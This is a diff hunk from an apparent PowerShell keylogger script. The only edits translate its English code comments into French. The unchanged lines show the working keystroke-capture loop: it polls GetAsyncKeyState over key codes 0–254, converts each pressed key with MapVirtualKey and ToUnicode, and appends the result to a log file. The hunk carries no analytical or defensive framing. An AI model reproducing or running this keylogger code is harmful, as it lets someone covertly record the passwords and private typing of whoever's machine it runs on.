@@ -46,25 +46,25 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             Start-Sleep -Milliseconds 40
       
             for ($ascii = 0; $ascii -le 254; $ascii++) {
-                # get current key state
+                # Récupérer l'état de la clé courante
                 $state = $API::GetAsyncKeyState($ascii)
 
-                # check if ctrl + c pressed?
+                # Regarder si la ctrl + c est pressé
                 if ($state -eq -32767) {
-                    # translate scan code to real code
+                    # traduire le code scané
                     $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-                    # get keyboard state for virtual keys
+                    # récupérer l'état du keyboard
                     $kbstate = New-Object Byte[] 256
                     
-                    # prepare a StringBuilder to receive input key
+                    # Préparer un String Builder
                     $mychar = New-Object -TypeName System.Text.StringBuilder
 
-                    # translate virtual key
+                    # traduction
                     $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
                     if ($success) {
-                        # add key to logger file
+                        # ajouter les touches enregistrées dans le fichier
                         [System.IO.File]::AppendAllText($path, $mychar, [System.Text.Encoding]::Unicode) 
                     }
                 }
